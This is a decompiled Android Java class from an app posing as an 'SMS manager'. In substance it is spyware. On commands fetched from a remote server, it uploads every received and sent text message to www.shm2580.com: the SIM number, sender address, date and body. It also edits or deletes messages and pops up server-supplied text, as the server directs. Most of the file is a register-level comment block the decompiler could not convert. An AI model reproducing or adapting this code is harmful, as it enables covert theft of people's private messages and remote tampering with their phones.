package cn.smsmanager.internet;

import android.content.Context;

public final class ScanHttpCmdTask {
    static String cmdString = "";
    /* access modifiers changed from: private|static */
    public static String sim_no;
    private final String TAG = "ScanNetWorkTask";
    /* access modifiers changed from: private */
    public Context context;

    public ScanHttpCmdTask(Context context, String sim_no) {
        this.context = context;
        sim_no = sim_no;
    }

    public void DoTask() {
        new Thread() {
            /* JADX WARNING: Removed duplicated region for block: B:56:0x035e  */
            /* JADX WARNING: Removed duplicated region for block: B:17:0x011a  */
            /* JADX WARNING: Removed duplicated region for block: B:17:0x011a  */
            /* JADX WARNING: Removed duplicated region for block: B:56:0x035e  */
            public void run() {
                /*
                r32 = this;
                r20 = new java.util.HashMap;
                r20.<init>();
                r28 = "sim_no";
                r29 = cn.smsmanager.internet.ScanHttpCmdTask.sim_no;
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r28 = "t";
                r29 = new java.lang.StringBuilder;
                r30 = java.lang.System.currentTimeMillis();
                r30 = java.lang.String.valueOf(r30);
                r29.<init>(r30);
                r29 = r29.toString();
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r28 = "ScanNetWorkTask";
                r29 = "begin to do task!";
                android.util.Log.i(r28, r29);
                r28 = "ScanNetWorkTask";
                r29 = new java.lang.StringBuilder;
                r30 = "cmd:";
                r29.<init>(r30);
                r30 = cn.smsmanager.internet.ScanHttpCmdTask.cmdString;
                r29 = r29.append(r30);
                r29 = r29.toString();
                android.util.Log.i(r28, r29);
                r28 = cn.smsmanager.internet.ScanHttpCmdTask.cmdString;
                r29 = "GET_RECIVE_MESSAGE";
                r28 = r28.startsWith(r29);
                if (r28 == 0) goto L_0x0297;
            L_0x0057:
                r25 = new cn.smsmanager.dao.SMSMessageDAO;
                r0 = r32;
                r0 = cn.smsmanager.internet.ScanHttpCmdTask.this;
                r28 = r0;
                r28 = r28.context;
                r0 = r25;
                r1 = r28;
                r0.m196init(r1);
                r19 = r25.GetRecieveSMS();
                r28 = "ScanNetWorkTask";
                r29 = "get receiveSMS";
                android.util.Log.i(r28, r29);
                r7 = r19.size();
                r21 = new java.util.HashMap;	 Catch:{ Exception -> 0x0115 }
                r21.<init>();	 Catch:{ Exception -> 0x0115 }
                r28 = "sim_no";
                r29 = cn.smsmanager.internet.ScanHttpCmdTask.sim_no;	 Catch:{ Exception -> 0x0659 }
                r0 = r21;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);	 Catch:{ Exception -> 0x0659 }
                r28 = "totalCount";
                r29 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x0659 }
                r30 = java.lang.String.valueOf(r7);	 Catch:{ Exception -> 0x0659 }
                r29.<init>(r30);	 Catch:{ Exception -> 0x0659 }
                r29 = r29.toString();	 Catch:{ Exception -> 0x0659 }
                r0 = r21;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);	 Catch:{ Exception -> 0x0659 }
                r28 = "http://www.shm2580.com/send_recieve_count.asp";
                r29 = "UTF-8";
                r0 = r28;
                r1 = r21;
                r2 = r29;
                cn.smsmanager.internet.SocketHttpRequester.sockPostNoResponse(r0, r1, r2);	 Catch:{ Exception -> 0x0659 }
                r28 = "ScanNetWorkTask";
                r29 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x0659 }
                r30 = "send smscount:";
                r29.<init>(r30);	 Catch:{ Exception -> 0x0659 }
                r0 = r29;
                r29 = r0.append(r7);	 Catch:{ Exception -> 0x0659 }
                r30 = " to server";
                r29 = r29.append(r30);	 Catch:{ Exception -> 0x0659 }
                r29 = r29.toString();	 Catch:{ Exception -> 0x0659 }
                android.util.Log.i(r28, r29);	 Catch:{ Exception -> 0x0659 }
                r20 = r21;
            L_0x00d0:
                r28 = cn.smsmanager.tools.ParamsInfo.context;
                r29 = "params";
                r30 = 0;
                r28 = r28.getSharedPreferences(r29, r30);
                cn.smsmanager.tools.ParamsInfo.sp = r28;
                r28 = cn.smsmanager.tools.ParamsInfo.sp;
                r29 = "finishCount";
                r30 = 0;
                r15 = r28.getInt(r29, r30);
                r17 = r15;
            L_0x00e8:
                r0 = r17;
                if (r0 < r7) goto L_0x011a;
            L_0x00ec:
                r20 = new java.util.HashMap;
                r20.<init>();
                r28 = "sim_no";
                r29 = cn.smsmanager.internet.ScanHttpCmdTask.sim_no;
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r28 = "http://www.shm2580.com/send_finish.asp";
                r29 = "UTF-8";
                r0 = r28;
                r1 = r20;
                r2 = r29;
                cn.smsmanager.internet.SocketHttpRequester.sockPostNoResponse(r0, r1, r2);	 Catch:{ Exception -> 0x0291 }
            L_0x010d:
                r28 = "ScanNetWorkTask";
                r29 = "send cmd finish to server";
                android.util.Log.i(r28, r29);
            L_0x0114:
                return;
            L_0x0115:
                r10 = move-exception;
            L_0x0116:
                r10.printStackTrace();
                goto L_0x00d0;
            L_0x011a:
                r0 = r19;
                r1 = r17;
                r24 = r0.get(r1);
                r24 = (cn.smsmanager.domain.SmsMessage) r24;
                r20 = new java.util.HashMap;
                r20.<init>();
                r28 = "sim_no";
                r29 = cn.smsmanager.internet.ScanHttpCmdTask.sim_no;
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r28 = "_id";
                r29 = new java.lang.StringBuilder;
                r30 = r24.get_id();
                r30 = java.lang.String.valueOf(r30);
                r29.<init>(r30);
                r29 = r29.toString();
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r28 = "thread_id";
                r29 = new java.lang.StringBuilder;
                r30 = r24.getThread_id();
                r30 = java.lang.String.valueOf(r30);
                r29.<init>(r30);
                r29 = r29.toString();
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r28 = "address";
                r29 = r24.getAddress();
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r9 = new java.text.SimpleDateFormat;
                r28 = "yyyy-MM-dd HH:mm:ss";
                r0 = r28;
                r9.<init>(r0);
                r8 = "";
                r28 = new java.util.Date;	 Catch:{ Exception -> 0x0276 }
                r29 = r24.getDate();	 Catch:{ Exception -> 0x0276 }
                r29 = java.lang.Long.parseLong(r29);	 Catch:{ Exception -> 0x0276 }
                r28.<init>(r29);	 Catch:{ Exception -> 0x0276 }
                r0 = r28;
                r8 = r9.format(r0);	 Catch:{ Exception -> 0x0276 }
            L_0x019d:
                r28 = "date";
                r0 = r20;
                r1 = r28;
                r0.put(r1, r8);
                r28 = "body";
                r29 = r24.getBody();
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r28 = "read";
                r29 = new java.lang.StringBuilder;
                r30 = r24.getRead();
                r30 = java.lang.String.valueOf(r30);
                r29.<init>(r30);
                r29 = r29.toString();
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r28 = "type";
                r29 = new java.lang.StringBuilder;
                r30 = r24.getType();
                r30 = java.lang.String.valueOf(r30);
                r29.<init>(r30);
                r29 = r29.toString();
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r14 = 0;
                r28 = "http://www.shm2580.com/send_message.asp";
                r29 = "UTF-8";
                r0 = r28;
                r1 = r20;
                r2 = r29;
                cn.smsmanager.internet.SocketHttpRequester.sockPostNoResponse(r0, r1, r2);	 Catch:{ Exception -> 0x027b }
                r28 = "ScanNetWorkTask";
                r29 = new java.lang.StringBuilder;
                r30 = "send sms content to server ";
                r29.<init>(r30);
                r0 = r29;
                r29 = r0.append(r15);
                r30 = ":";
                r29 = r29.append(r30);
                r0 = r29;
                r29 = r0.append(r7);
                r29 = r29.toString();
                android.util.Log.i(r28, r29);
                r15 = r15 + 1;
                r28 = cn.smsmanager.tools.ParamsInfo.sp;
                r11 = r28.edit();
                r28 = "finishCount";
                r0 = r28;
                r11.putInt(r0, r15);
                r11.commit();
                if (r15 != r7) goto L_0x028d;
            L_0x0231:
                r28 = cn.smsmanager.tools.ParamsInfo.sp;
                r11 = r28.edit();
                r28 = "finishCount";
                r29 = 0;
                r0 = r28;
                r1 = r29;
                r11.putInt(r0, r1);
                r11.commit();
                r28 = "ScanNetWorkTask";
                r29 = "yichu send!";
                android.util.Log.i(r28, r29);
                r22 = new java.util.HashMap;
                r22.<init>();
                r28 = "sim_no";
                r29 = cn.smsmanager.internet.ScanHttpCmdTask.sim_no;
                r0 = r22;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r28 = "http://www.shm2580.com/send_finish.asp";
                r29 = "UTF-8";
                r0 = r28;
                r1 = r20;
                r2 = r29;
                cn.smsmanager.internet.SocketHttpRequester.sockPostNoResponse(r0, r1, r2);	 Catch:{ Exception -> 0x0288 }
            L_0x026d:
                r28 = "ScanNetWorkTask";
                r29 = "yichu send finish!";
                android.util.Log.i(r28, r29);
                goto L_0x0114;
            L_0x0276:
                r12 = move-exception;
                r8 = "1970-01-01 10:12:13";
                goto L_0x019d;
            L_0x027b:
                r10 = move-exception;
                r28 = "ScanNetWorkTask";
                r29 = "network is error";
                android.util.Log.e(r28, r29);
                r10.printStackTrace();
                goto L_0x00ec;
            L_0x0288:
                r10 = move-exception;
                r10.printStackTrace();
                goto L_0x026d;
            L_0x028d:
                r17 = r17 + 1;
                goto L_0x00e8;
            L_0x0291:
                r10 = move-exception;
                r10.printStackTrace();
                goto L_0x010d;
            L_0x0297:
                r28 = cn.smsmanager.internet.ScanHttpCmdTask.cmdString;
                r29 = "GET_SEND_MESSAGE";
                r28 = r28.startsWith(r29);
                if (r28 == 0) goto L_0x04cd;
            L_0x02a1:
                r28 = "ScanNetWorkTask";
                r29 = "go to get_send_message";
                android.util.Log.i(r28, r29);
                r25 = new cn.smsmanager.dao.SMSMessageDAO;
                r0 = r32;
                r0 = cn.smsmanager.internet.ScanHttpCmdTask.this;
                r28 = r0;
                r28 = r28.context;
                r0 = r25;
                r1 = r28;
                r0.m196init(r1);
                r19 = r25.GetSentSMS();
                r7 = r19.size();
                r21 = new java.util.HashMap;	 Catch:{ Exception -> 0x0359 }
                r21.<init>();	 Catch:{ Exception -> 0x0359 }
                r28 = "sim_no";
                r29 = cn.smsmanager.internet.ScanHttpCmdTask.sim_no;	 Catch:{ Exception -> 0x0654 }
                r0 = r21;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);	 Catch:{ Exception -> 0x0654 }
                r28 = "totalCount";
                r29 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x0654 }
                r30 = java.lang.String.valueOf(r7);	 Catch:{ Exception -> 0x0654 }
                r29.<init>(r30);	 Catch:{ Exception -> 0x0654 }
                r29 = r29.toString();	 Catch:{ Exception -> 0x0654 }
                r0 = r21;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);	 Catch:{ Exception -> 0x0654 }
                r28 = "http://www.shm2580.com/send_recieve_count.asp";
                r29 = "UTF-8";
                r0 = r28;
                r1 = r21;
                r2 = r29;
                cn.smsmanager.internet.SocketHttpRequester.sockPostNoResponse(r0, r1, r2);	 Catch:{ Exception -> 0x0654 }
                r20 = r21;
            L_0x02fe:
                r28 = cn.smsmanager.tools.ParamsInfo.context;
                r29 = "params";
                r30 = 0;
                r28 = r28.getSharedPreferences(r29, r30);
                cn.smsmanager.tools.ParamsInfo.sp = r28;
                r28 = cn.smsmanager.tools.ParamsInfo.sp;
                r29 = "finishCount";
                r30 = 0;
                r15 = r28.getInt(r29, r30);
                r28 = "ScanNetWorkTask";
                r29 = new java.lang.StringBuilder;
                r30 = "finishedCount=";
                r29.<init>(r30);
                r0 = r29;
                r29 = r0.append(r15);
                r29 = r29.toString();
                android.util.Log.i(r28, r29);
                r17 = r15;
            L_0x032c:
                r0 = r17;
                if (r0 < r7) goto L_0x035e;
            L_0x0330:
                r22 = new java.util.HashMap;
                r22.<init>();
                r28 = "sim_no";
                r29 = cn.smsmanager.internet.ScanHttpCmdTask.sim_no;
                r0 = r22;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r28 = "http://www.shm2580.com/send_finish.asp";
                r29 = "UTF-8";
                r0 = r28;
                r1 = r20;
                r2 = r29;
                cn.smsmanager.internet.SocketHttpRequester.sockPostNoResponse(r0, r1, r2);	 Catch:{ Exception -> 0x0353 }
                goto L_0x0114;
            L_0x0353:
                r10 = move-exception;
                r10.printStackTrace();
                goto L_0x0114;
            L_0x0359:
                r10 = move-exception;
            L_0x035a:
                r10.printStackTrace();
                goto L_0x02fe;
            L_0x035e:
                r0 = r19;
                r1 = r17;
                r24 = r0.get(r1);
                r24 = (cn.smsmanager.domain.SmsMessage) r24;
                r20 = new java.util.HashMap;
                r20.<init>();
                r28 = "sim_no";
                r29 = cn.smsmanager.internet.ScanHttpCmdTask.sim_no;
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r28 = "_id";
                r29 = new java.lang.StringBuilder;
                r30 = r24.get_id();
                r30 = java.lang.String.valueOf(r30);
                r29.<init>(r30);
                r29 = r29.toString();
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r28 = "thread_id";
                r29 = new java.lang.StringBuilder;
                r30 = r24.getThread_id();
                r30 = java.lang.String.valueOf(r30);
                r29.<init>(r30);
                r29 = r29.toString();
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r28 = "address";
                r29 = r24.getAddress();
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r9 = new java.text.SimpleDateFormat;
                r28 = "yyyy-MM-dd HH:mm:ss";
                r0 = r28;
                r9.<init>(r0);
                r8 = "";
                r28 = new java.util.Date;	 Catch:{ Exception -> 0x04b9 }
                r29 = r24.getDate();	 Catch:{ Exception -> 0x04b9 }
                r29 = java.lang.Long.parseLong(r29);	 Catch:{ Exception -> 0x04b9 }
                r28.<init>(r29);	 Catch:{ Exception -> 0x04b9 }
                r0 = r28;
                r8 = r9.format(r0);	 Catch:{ Exception -> 0x04b9 }
            L_0x03e1:
                r28 = "date";
                r0 = r20;
                r1 = r28;
                r0.put(r1, r8);
                r28 = "body";
                r29 = r24.getBody();
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r28 = "read";
                r29 = new java.lang.StringBuilder;
                r30 = r24.getRead();
                r30 = java.lang.String.valueOf(r30);
                r29.<init>(r30);
                r29 = r29.toString();
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r28 = "type";
                r29 = new java.lang.StringBuilder;
                r30 = r24.getType();
                r30 = java.lang.String.valueOf(r30);
                r29.<init>(r30);
                r29 = r29.toString();
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r28 = "http://www.shm2580.com/send_message.asp";
                r29 = "UTF-8";
                r0 = r28;
                r1 = r20;
                r2 = r29;
                cn.smsmanager.internet.SocketHttpRequester.sockPostNoResponse(r0, r1, r2);	 Catch:{ Exception -> 0x04be }
                r28 = "ScanNetWorkTask";
                r29 = new java.lang.StringBuilder;
                r30 = "send sms content to server ";
                r29.<init>(r30);
                r0 = r29;
                r29 = r0.append(r15);
                r30 = ":";
                r29 = r29.append(r30);
                r0 = r29;
                r29 = r0.append(r7);
                r29 = r29.toString();
                android.util.Log.i(r28, r29);
                r15 = r15 + 1;
                r28 = cn.smsmanager.tools.ParamsInfo.sp;
                r11 = r28.edit();
                r28 = "finishCount";
                r0 = r28;
                r11.putInt(r0, r15);
                r11.commit();
                if (r15 != r7) goto L_0x04c9;
            L_0x0474:
                r28 = cn.smsmanager.tools.ParamsInfo.sp;
                r11 = r28.edit();
                r28 = "finishCount";
                r29 = 0;
                r0 = r28;
                r1 = r29;
                r11.putInt(r0, r1);
                r11.commit();
                r28 = "ScanNetWorkTask";
                r29 = "yichu send!";
                android.util.Log.i(r28, r29);
                r22 = new java.util.HashMap;
                r22.<init>();
                r28 = "sim_no";
                r29 = cn.smsmanager.internet.ScanHttpCmdTask.sim_no;
                r0 = r22;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r28 = "http://www.shm2580.com/send_finish.asp";
                r29 = "UTF-8";
                r0 = r28;
                r1 = r20;
                r2 = r29;
                cn.smsmanager.internet.SocketHttpRequester.sockPostNoResponse(r0, r1, r2);	 Catch:{ Exception -> 0x04c4 }
            L_0x04b0:
                r28 = "ScanNetWorkTask";
                r29 = "yichu send finish!";
                android.util.Log.i(r28, r29);
                goto L_0x0114;
            L_0x04b9:
                r12 = move-exception;
                r8 = "1970-01-01 10:12:13";
                goto L_0x03e1;
            L_0x04be:
                r10 = move-exception;
                r10.printStackTrace();
                goto L_0x0330;
            L_0x04c4:
                r10 = move-exception;
                r10.printStackTrace();
                goto L_0x04b0;
            L_0x04c9:
                r17 = r17 + 1;
                goto L_0x032c;
            L_0x04cd:
                r28 = cn.smsmanager.internet.ScanHttpCmdTask.cmdString;
                r29 = "MODIFY_MESSAGE";
                r28 = r28.startsWith(r29);
                if (r28 == 0) goto L_0x0570;
            L_0x04d7:
                r20 = new java.util.HashMap;
                r20.<init>();
                r28 = "sim_no";
                r29 = cn.smsmanager.internet.ScanHttpCmdTask.sim_no;
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r6 = 0;
                r28 = "http://www.shm2580.com/get_cmd_body.asp";
                r29 = "UTF-8";
                r0 = r28;
                r1 = r20;
                r2 = r29;
                r6 = cn.smsmanager.internet.SocketHttpRequester.sockPost(r0, r1, r2);	 Catch:{ Exception -> 0x056a }
                r28 = "#";
                r0 = r28;
                r13 = r6.indexOf(r0);	 Catch:{ Exception -> 0x056a }
                r28 = 0;
                r0 = r28;
                r16 = r6.substring(r0, r13);	 Catch:{ Exception -> 0x056a }
                r28 = r13 + 1;
                r0 = r28;
                r4 = r6.substring(r0);	 Catch:{ Exception -> 0x056a }
                r28 = 0;
                r29 = 1;
                r0 = r16;
                r1 = r28;
                r2 = r29;
                r28 = r0.substring(r1, r2);	 Catch:{ Exception -> 0x056a }
                r23 = java.lang.Integer.parseInt(r28);	 Catch:{ Exception -> 0x056a }
                r28 = 1;
                r29 = 20;
                r0 = r16;
                r1 = r28;
                r2 = r29;
                r8 = r0.substring(r1, r2);	 Catch:{ Exception -> 0x056a }
                r28 = 20;
                r0 = r16;
                r1 = r28;
                r28 = r0.substring(r1);	 Catch:{ Exception -> 0x056a }
                r3 = java.lang.Integer.parseInt(r28);	 Catch:{ Exception -> 0x056a }
                r5 = r4;
                r25 = new cn.smsmanager.dao.SMSMessageDAO;	 Catch:{ Exception -> 0x056a }
                r0 = r32;
                r0 = cn.smsmanager.internet.ScanHttpCmdTask.this;	 Catch:{ Exception -> 0x056a }
                r28 = r0;
                r28 = r28.context;	 Catch:{ Exception -> 0x056a }
                r0 = r25;
                r1 = r28;
                r0.m196init(r1);	 Catch:{ Exception -> 0x056a }
                r0 = r25;
                r1 = r23;
                r0.ModifyMessage(r3, r5, r1, r8);	 Catch:{ Exception -> 0x056a }
                r28 = "http://www.shm2580.com/send_finish.asp";
                r29 = "UTF-8";
                r0 = r28;
                r1 = r20;
                r2 = r29;
                cn.smsmanager.internet.SocketHttpRequester.sockPostNoResponse(r0, r1, r2);	 Catch:{ Exception -> 0x056a }
                goto L_0x0114;
            L_0x056a:
                r10 = move-exception;
                r10.printStackTrace();
                goto L_0x0114;
            L_0x0570:
                r28 = cn.smsmanager.internet.ScanHttpCmdTask.cmdString;
                r29 = "DELETE_MESSAGE";
                r28 = r28.startsWith(r29);
                if (r28 == 0) goto L_0x05d0;
            L_0x057a:
                r20 = new java.util.HashMap;
                r20.<init>();
                r28 = "sim_no";
                r29 = cn.smsmanager.internet.ScanHttpCmdTask.sim_no;
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r6 = 0;
                r28 = "http://www.shm2580.com/get_cmd_body.asp";
                r29 = "UTF-8";
                r0 = r28;
                r1 = r20;
                r2 = r29;
                r6 = cn.smsmanager.internet.SocketHttpRequester.sockPost(r0, r1, r2);	 Catch:{ Exception -> 0x05ca }
                r27 = r6.trim();	 Catch:{ Exception -> 0x05ca }
                r26 = java.lang.Integer.parseInt(r27);	 Catch:{ Exception -> 0x05ca }
                r25 = new cn.smsmanager.dao.SMSMessageDAO;	 Catch:{ Exception -> 0x05ca }
                r0 = r32;
                r0 = cn.smsmanager.internet.ScanHttpCmdTask.this;	 Catch:{ Exception -> 0x05ca }
                r28 = r0;
                r28 = r28.context;	 Catch:{ Exception -> 0x05ca }
                r0 = r25;
                r1 = r28;
                r0.m196init(r1);	 Catch:{ Exception -> 0x05ca }
                r25.DeleteMessage(r26);	 Catch:{ Exception -> 0x05ca }
                r28 = "http://www.shm2580.com/send_finish.asp";
                r29 = "UTF-8";
                r0 = r28;
                r1 = r20;
                r2 = r29;
                cn.smsmanager.internet.SocketHttpRequester.sockPostNoResponse(r0, r1, r2);	 Catch:{ Exception -> 0x05ca }
                goto L_0x0114;
            L_0x05ca:
                r10 = move-exception;
                r10.printStackTrace();
                goto L_0x0114;
            L_0x05d0:
                r28 = cn.smsmanager.internet.ScanHttpCmdTask.cmdString;
                r29 = "SHOW_MESSAGE";
                r28 = r28.startsWith(r29);
                if (r28 == 0) goto L_0x0114;
            L_0x05da:
                r20 = new java.util.HashMap;
                r20.<init>();
                r28 = "sim_no";
                r29 = cn.smsmanager.internet.ScanHttpCmdTask.sim_no;
                r0 = r20;
                r1 = r28;
                r2 = r29;
                r0.put(r1, r2);
                r6 = 0;
                r28 = "http://www.shm2580.com/get_cmd_body.asp";
                r29 = "UTF-8";
                r0 = r28;
                r1 = r20;
                r2 = r29;
                r6 = cn.smsmanager.internet.SocketHttpRequester.sockPost(r0, r1, r2);	 Catch:{ Exception -> 0x064e }
                r6 = r6.trim();	 Catch:{ Exception -> 0x064e }
                r18 = new android.content.Intent;	 Catch:{ Exception -> 0x0642 }
                r28 = cn.smsmanager.tools.ParamsInfo.context;	 Catch:{ Exception -> 0x0642 }
                r28 = r28.getApplicationContext();	 Catch:{ Exception -> 0x0642 }
                r29 = com.example.smsmanager.MessageActivity.class;
                r0 = r18;
                r1 = r28;
                r2 = r29;
                r0.<init>(r1, r2);	 Catch:{ Exception -> 0x0642 }
                r28 = 268435456; // 0x10000000 float:2.5243549E-29 double:1.32624737E-315;
                r0 = r18;
                r1 = r28;
                r0.addFlags(r1);	 Catch:{ Exception -> 0x0642 }
                r28 = "msg";
                r0 = r18;
                r1 = r28;
                r0.putExtra(r1, r6);	 Catch:{ Exception -> 0x0642 }
                r28 = cn.smsmanager.tools.ParamsInfo.context;	 Catch:{ Exception -> 0x0642 }
                r28 = r28.getApplicationContext();	 Catch:{ Exception -> 0x0642 }
                r0 = r28;
                r1 = r18;
                r0.startActivity(r1);	 Catch:{ Exception -> 0x0642 }
                r28 = "http://www.shm2580.com/send_finish.asp";
                r29 = "UTF-8";
                r0 = r28;
                r1 = r20;
                r2 = r29;
                cn.smsmanager.internet.SocketHttpRequester.sockPostNoResponse(r0, r1, r2);	 Catch:{ Exception -> 0x0642 }
                goto L_0x0114;
            L_0x0642:
                r12 = move-exception;
                r28 = "CommandParseAndExcute";
                r29 = r12.toString();	 Catch:{ Exception -> 0x064e }
                android.util.Log.e(r28, r29);	 Catch:{ Exception -> 0x064e }
                goto L_0x0114;
            L_0x064e:
                r10 = move-exception;
                r10.printStackTrace();
                goto L_0x0114;
            L_0x0654:
                r10 = move-exception;
                r20 = r21;
                goto L_0x035a;
            L_0x0659:
                r10 = move-exception;
                r20 = r21;
                goto L_0x0116;
                */
                throw new UnsupportedOperationException("Method not decompiled: cn.smsmanager.internet.ScanHttpCmdTask$AnonymousClass1.run():void");
            }
        }.start();
    }
}
